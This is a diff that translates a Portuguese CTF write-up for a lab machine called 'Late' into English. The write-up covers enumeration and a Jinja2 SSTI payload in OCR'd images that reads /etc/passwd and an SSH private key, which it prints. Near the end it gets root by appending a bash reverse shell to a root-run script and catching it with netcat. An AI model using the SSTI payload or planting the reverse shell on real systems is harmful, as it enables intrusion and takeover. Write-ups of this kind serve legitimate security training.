@@ -1,102 +1,102 @@
 # Late
 
-## Enumeração
+## Enumeration
 
-Primeiramente, enumerando as portas e serviços assecíveis usando o **nmap**:
+First, let's enumerate the accessible ports and services using **nmap**:
 
-![Untitled](images/Untitled.png)
+![Nmap scan results](images/Untitled.png)
 
-Observamos que existe uma aplicação web rodando na porta 80 (**http** padrão). Ao acessarmos o site, existe uma página “Home” e uma página “Contact”, essa segunda possui um formulário que não envia nenhuma request ao servidor realmente, portanto é apenas um enfeite.
+We observe that there is a web application running on port 80 (default HTTP). When we access the website, we find a "Home" page and a "Contact" page. The latter has a form that does not actually send any request to the server, so it is just for show.
 
-![Untitled](images/Untitled%201.png)
+![Home page](images/Untitled%201.png)
 
-![Untitled](images/Untitled%202.png)
+![Contact page](images/Untitled%202.png)
 
-Conseguimos extrair a informação do domínio pelo email no rodapé “support@late.htb”; e na *Home*, encontramos um link para images.late.htb, que é um subdomínio. Após acrescentá-los no arquivo **/etc/hosts**:
+We can extract the domain name from the email address in the footer ("support@late.htb"). Additionally, on the *Home* page, we find a link to `images.late.htb`, which is a subdomain. After adding these to the `/etc/hosts` file:
 
-![Untitled](images/Untitled%203.png)
+![Configured /etc/hosts file](images/Untitled%203.png)
 
-### Enumerando diretórios e subdomínios
+### Directory and Subdomain Enumeration
 
-Utilizando o gobuster e as [SecLists](https://github.com/danielmiessler/SecLists):
+Using gobuster and [SecLists](https://github.com/danielmiessler/SecLists):
 
-```
+```bash
 gobuster dir -w ~/SecLists/Discovery/Web-Content/raft-small-directories.txt -u 10.10.11.156
 gobuster dns -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -d late.htb
 ```
 
-Não descobrimos nada na enumeração de diretórios, e a enumeração de subdomínios confirmou apenas o images.late.htb que já conhecíamos:
+No directories were discovered during directory enumeration, and subdomain enumeration only confirmed `images.late.htb`, which we already knew:
 
-![Untitled](images/Untitled%204.png)
+![Subdomain enumeration results](images/Untitled%204.png)
 
-### Olhando images.late.htb
+### Analyzing images.late.htb
 
-Encontramos um serviço que detecta textos em uma imagem e transforma em texto plano. A funcionalidade dessa aplicação é bem ruim, a chance dela não entender o texto na imagem é muito grande, mesmo estando bem claro.
+We find a service that detects text in an image and converts it into plain text (OCR). The application is quite finicky, and there is a high chance it will not recognize text in the image, even if it is very clear.
 
-![Untitled](images/Untitled%205.png)
+![OCR Web application page](images/Untitled%205.png)
 
-## Exploração
+## Exploitation
 
-Vamos usar o ImageMagick para fazer alguns testes:
+We will use ImageMagick to perform some tests:
 
-```
+```bash
 convert -gravity center -background black -fill white -size 2000x300 caption:'test' test.png
 ```
 
-Com esse comando, criamos uma imagem escrito “test” dentro dela:
+With this command, we create an image containing the text "test":
 
-![Untitled](images/Untitled%206.png)
+![Generated image with test text](images/Untitled%206.png)
 
-Ao enviarmos pelo site, o resultado é um arquivo **.txt** com o seguinte conteúdo:
+Upon uploading it to the website, the output is a **.txt** file with the following content:
 
-```
+```html
 <p>test
 </p>
 ```
 
-Essa tag **HTML** <p> é um pouco suspeita, testando se existe Server-side Template Injection com a seguinte imagem:
+This HTML `<p>` tag is suspicious. Let's test for Server-Side Template Injection (SSTI) using the following image:
 
-![testssti.png](images/testssti.png)
+![SSTI test image](images/testssti.png)
 
-Observamos o seguinte comportamento:
+We observe the following behavior:
 
-![Untitled](images/Untitled%207.png)
+![SSTI test result](images/Untitled%207.png)
 
-Testando com uma sintaxe específica:
+Testing with a specific syntax:
 
-![testssti2.png](images/testssti2.png)
+![Specific SSTI test image](images/testssti2.png)
 
-```
+```html
 <p>12
 </p>
 ```
 
-Confirmamos assim que realmente existe um SSTI. Como estamos numa aplicação feita em **Flask**, é muito provável que a template engine seja o **Jinja2**, que é a padrão.
+This confirms the presence of SSTI. Since the application is built using **Flask**, it is highly probable that the template engine is **Jinja2**, which is the default.
 
-Testando mais um payload:
+Testing another payload:
 
-![Untitled](images/Untitled%208.png)
+![Jinja2 test payload image](images/Untitled%208.png)
 
-```
+```html
 <p>444
 </p>
 ```
 
-Esse é realmente um comportamento esperado para o **Jinja2**!
+This behavior is indeed expected for **Jinja2**!
 
-![SSTI](images/ssti.png)
+![SSTI decision tree](images/ssti.png)
 
-Fonte: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
+Source: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
 
-Utilizando essa vulnerabilidade para ler arquivos da máquina:
+Exploiting this vulnerability to read files from the system:
 
-```
+```jinja2
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-![passwd2.png](images/passwd2.png)
+![Reading /etc/passwd](images/passwd2.png)
 
-```
+```text
 <p>root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -141,11 +141,11 @@ smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
 </p>
 ```
 
-Observe o usuário svc_acc, provavelmente é ele que está rodando a aplicação. Vemos que ele esqueceu a chave privada para acessar o **ssh** na pasta **.ssh**:
+Note the `svc_acc` user; they are likely the user running the application. We can see they left their private SSH key in their `.ssh` directory:
 
-![ssh.png](images/ssh.png)
+![Reading SSH private key](images/ssh.png)
 
-```
+```text
 <p>-----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
 HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
@@ -177,56 +177,56 @@ kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
 </p>
 ```
 
-## Pós-exploração
+## Post-Exploitation
 
-Basta então salvarmos essa chave e acessarmos o usuário via **ssh**.
+We just need to save this key and log in as the user via **SSH**:
 
-```
+```bash
 ssh -i sshkey svc_acc@10.10.11.156
 ```
 
-Achamos a flag de usuário:
+We locate the user flag:
 
-```
+```bash
 cat user.txt
 ```
 
-### Escalação de privilégios
+### Privilege Escalation
 
-Subindo o **linpeas** e o **pspy**:
+Uploading **linpeas** and **pspy** to the machine:
 
-![Untitled](images/Untitled%209.png)
+![Uploading scripts](images/Untitled%209.png)
 
-Dando permissão de execução:
+Granting execution permissions:
 
-```
+```bash
 chmod +x linpeas.sh pspy
 ```
 
-Ao rodar o **linpeas**, descobrimos o seguinte arquivo:
+Running **linpeas** reveals the following file:
 
-![Untitled](images/Untitled%2010.png)
+![linpeas output showing ssh-alert.sh](images/Untitled%2010.png)
 
-Vemos que somos o dono desse arquivo e que temos permissão de **append** (flag **a** no último comando).
+We see that we own this file and have the **append** attribute set (flag **a** in the output).
 
-Esse script **ssh-alert.sh** aparenta enviar um email para o root toda vez que alguém realiza login via **ssh**. Vamos testar essa funcionalidade e observar com o **pspy**:
+This **ssh-alert.sh** script seems to send an email to root every time someone logs in via **SSH**. Let's test this functionality and monitor it using **pspy**:
 
-![Untitled](images/Untitled%2011.png)
+![pspy output showing ssh-alert.sh execution](images/Untitled%2011.png)
 
-Note que o script (**ssh-alert.sh**) é executado pelo root (UID=0) quando um usuário loga. Sabendo disso, vamos editar então esse script para quando o root executar, obtermos uma reverse shell dele.
+Notice that the script (**ssh-alert.sh**) is executed by root (UID=0) when a user logs in. Knowing this, we can edit this script so that when root executes it, we obtain a reverse shell.
 
-```
-echo 'bash -i >& /dev/tcp/SEU-IP/PORTA 0>&1' >> /usr/local/sbin/ssh-alert.sh
-```
-
-No seu terminal:
-
-```
-nc -lnvp PORTA
+```bash
+echo 'bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1' >> /usr/local/sbin/ssh-alert.sh
 ```
 
-Ao logarmos novamente com svc_acc, obtemos então acesso ao root.
+On your host terminal:
 
+```bash
+nc -lnvp PORT
 ```
+
+After logging in again as `svc_acc`, we obtain root access:
+
+```bash
 cat /root/root.txt
 ```
